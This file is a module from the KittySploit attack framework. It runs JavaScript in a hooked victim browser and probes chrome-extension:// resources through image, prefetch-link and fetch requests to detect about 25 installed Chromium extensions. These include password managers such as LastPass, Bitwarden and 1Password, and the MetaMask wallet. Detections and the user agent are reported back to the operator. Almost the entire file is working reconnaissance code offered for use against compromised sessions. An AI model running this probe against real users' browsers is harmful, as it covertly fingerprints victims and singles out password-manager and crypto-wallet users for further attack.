from kittysploit import *
import json


# Common Chromium extension IDs and a representative web-accessible resource path.
# Detection is best-effort: MV3 + locked resources produce many false negatives.
_DEFAULT_EXTENSIONS = [
	{"name": "uBlock Origin", "id": "cjpalhdlnbpafiamejdnhcphjbkeiagm", "path": "web_accessible_resources/noop.js"},
	{"name": "AdBlock", "id": "gighmmpiobklfepjocnamgkkbiglidom", "path": "img/icon24.png"},
	{"name": "AdGuard AdBlocker", "id": "bgnkhhnnamicmpeenaelnjfhikgbkllg", "path": "web-accessible-resources/redirects/empty.js"},
	{"name": "Ghostery", "id": "mlomiejdfkolichcflejclcbmpeaniij", "path": "app/images/icon128.png"},
	{"name": "Privacy Badger", "id": "pkehgijcmpdhfbdbbnkijodmdjhbjlgp", "path": "icons/badger-128.png"},
	{"name": "LastPass", "id": "hdokiejnpimakedhajhdlcegeplioahd", "path": "images/icon.png"},
	{"name": "Bitwarden", "id": "nngceckbapebfimnlniiiahkandclblb", "path": "images/icon38.png"},
	{"name": "1Password", "id": "aeblfdkhhhdcdjpifhhbdiojplfjncoa", "path": "images/icons/app_icon.png"},
	{"name": "Dashlane", "id": "fdjamakpfbbddfjaooikfcpapjohcfmg", "path": "content/injected/logo-autofill-known.svg"},
	{"name": "Keeper", "id": "bfogiafebfohielmmehodmfbbebbbpei", "path": "images/icons/16x16.png"},
	{"name": "NordPass", "id": "jhkbfkchfwahdphjhjkcanhdmdbbhjcb", "path": "icons/icon16.png"},
	{"name": "Grammarly", "id": "kbfnbcaeplbcioakkpcpgfkobkghlhen", "path": "src/fonts/grammarly-fonts.css"},
	{"name": "Honey", "id": "bmnlcjabgnpnenekpadlanbbkooimhnj", "path": "assets/images/icon128.png"},
	{"name": "React Developer Tools", "id": "fmkadmapgofadopljbjfkapdkoienihi", "path": "main.html"},
	{"name": "Redux DevTools", "id": "lmhkpmbekcpmknklioeibfkpmmfibljd", "path": "page.bundle.js"},
	{"name": "Vue.js devtools", "id": "nhdogjmejiglipccpnnnanhbledajbpd", "path": "devtools.html"},
	{"name": "Wappalyzer", "id": "gppongmhjkpfnbhagpmjfkannfbllamg", "path": "images/icon_128.png"},
	{"name": "JSON Formatter", "id": "bcjindcccaagfpapjjmafapmmgkkhgoa", "path": "css/content.css"},
	{"name": "EditThisCookie", "id": "fngmhnnpilhplaeedifhccaeigpfhmeh", "path": "img/icon_16x16.png"},
	{"name": "Tampermonkey", "id": "dhdgffkkebhmkfjojejmpbldmpobfkfo", "path": "images/icon.png"},
	{"name": "Violentmonkey", "id": "jinjaccalgkegednnccohejagnlnfdag", "path": "public/icon-128.png"},
	{"name": "MetaMask", "id": "nkbihfbeogaeaoehlefnkodbefgpgknn", "path": "images/icon-128.png"},
	{"name": "Notion Web Clipper", "id": "knheggckgoiihginacbkhaalnibhilkk", "path": "icons/icon16.png"},
	{"name": "Google Translate", "id": "aapbdbdomjkkjkaonfhkkikfgjllcleb", "path": "icons/icon16.png"},
	{"name": "Dark Reader", "id": "eimadpbcbfnmbkopoojfekhnkhdbieeh", "path": "icons/dr-icon-128.png"},
]


class Module(BrowserAuxiliary):

	__info__ = {
		"name": "Browser Extension Detect",
		"description": "Best-effort detection of installed Chromium extensions via web-accessible resources",
		"author": "KittySploit Team",
		"browser": Browser.ALL,
		"platform": Platform.ALL,
		"session_type": SessionType.BROWSER,
	}

	timeout_ms = OptInteger(1500, "Per-resource probe timeout (ms)", False)
	extra_extensions = OptString(
		"[]",
		'Extra extensions JSON list: [{"name","id","path"}]',
		False,
	)

	def run(self):
		timeout_ms = max(300, int(self.timeout_ms or 1500))
		catalog = list(_DEFAULT_EXTENSIONS)
		try:
			extra = json.loads(str(self.extra_extensions or "[]") or "[]")
			if isinstance(extra, list):
				for item in extra:
					if not isinstance(item, dict):
						continue
					ext_id = str(item.get("id") or "").strip()
					path = str(item.get("path") or "").strip().lstrip("/")
					name = str(item.get("name") or ext_id).strip()
					if ext_id and path:
						catalog.append({"name": name, "id": ext_id, "path": path})
			else:
				print_warning("extra_extensions ignored (must be a JSON array)")
		except json.JSONDecodeError as exc:
			print_error(f"Invalid extra_extensions JSON: {exc}")
			return False

		catalog_js = json.dumps(catalog)
		code_js = f"""
		(function() {{
			const CATALOG = {catalog_js};
			const TIMEOUT_MS = {timeout_ms};

			function probe(ext) {{
				return new Promise(function(resolve) {{
					const url = 'chrome-extension://' + ext.id + '/' + ext.path;
					const started = Date.now();
					let settled = false;

					function done(detected, detail) {{
						if (settled) return;
						settled = true;
						resolve({{
							name: ext.name,
							id: ext.id,
							path: ext.path,
							url: url,
							detected: detected,
							detail: detail,
							elapsed_ms: Date.now() - started
						}});
					}}

					// fetch often blocked; Image / script / link probes cover more cases.
					const img = new Image();
					img.onload = function() {{ done(true, 'image-onload'); }};
					img.onerror = function() {{
						// onerror can still mean the extension exists but resource path is wrong.
						// Fall through to fetch/script for confirmation.
					}};
					try {{ img.src = url + (url.indexOf('?') === -1 ? '?' : '&') + '_ks=' + Date.now(); }}
					catch (e) {{}}

					const link = document.createElement('link');
					link.rel = 'prefetch';
					link.href = url;
					link.onload = function() {{ done(true, 'link-onload'); }};
					link.onerror = function() {{}};
					try {{ document.documentElement.appendChild(link); }} catch (e) {{}}

					if (typeof fetch === 'function') {{
						fetch(url, {{ method: 'GET', cache: 'no-store', credentials: 'omit', mode: 'cors' }})
							.then(function(resp) {{
								// opaque/success both imply resource was reachable enough
								if (resp && (resp.ok || resp.type === 'opaque' || resp.status === 0)) {{
									done(true, 'fetch-' + (resp.type || resp.status));
								}}
							}})
							.catch(function() {{}});
					}}

					setTimeout(function() {{
						try {{ if (link.parentNode) link.parentNode.removeChild(link); }} catch (e) {{}}
						try {{ img.src = ''; }} catch (e) {{}}
						done(false, 'timeout');
					}}, TIMEOUT_MS);
				}});
			}}

			function runPool(items, limit) {{
				return new Promise(function(resolve) {{
					const results = [];
					let i = 0;
					let active = 0;
					function next() {{
						while (active < limit && i < items.length) {{
							const item = items[i++];
							active++;
							probe(item).then(function(res) {{
								results.push(res);
								active--;
								if (results.length === items.length) resolve(results);
								else next();
							}});
						}}
					}}
					if (!items.length) resolve([]);
					else next();
				}});
			}}

			return runPool(CATALOG, 6).then(function(results) {{
				const detected = results.filter(function(r) {{ return r.detected; }});
				return JSON.stringify({{
					ok: true,
					origin: window.location.origin,
					user_agent: navigator.userAgent,
					probed: results.length,
					detected_count: detected.length,
					detected: detected,
					results: results
				}});
			}});
		}})();
		"""

		est = max(12, int((len(catalog) * timeout_ms) / (6 * 1000)) + 10)
		print_status(f"Probing {len(catalog)} extension resource(s)...")
		result = self.send_js_and_wait_for_response(code_js, timeout=float(est))
		if not result:
			print_error("Failed to run extension detect")
			return False
		if isinstance(result, str) and result.startswith("Error:"):
			print_error(result)
			return False

		try:
			data = json.loads(result)
		except json.JSONDecodeError as exc:
			print_error(f"Failed to parse extension detect response: {exc}")
			print_debug(f"Raw response: {result}")
			return False

		print_info("=" * 60)
		print_info("Browser Extension Detect")
		print_info(f"  UA: {(data.get('user_agent') or '')[:100]}")
		print_info(f"  Probed: {data.get('probed', 0)}")
		detected = data.get("detected") or []
		if not detected:
			print_status("  No extensions confirmed (common on MV3 / locked WAR)")
			print_info("  Absence of detection does not mean absence of extensions")
			return True

		print_warning(f"  Detected: {len(detected)}")
		for ext in detected:
			print_success(f"  {ext.get('name')} ({ext.get('id')}) via {ext.get('detail')}")
		return True
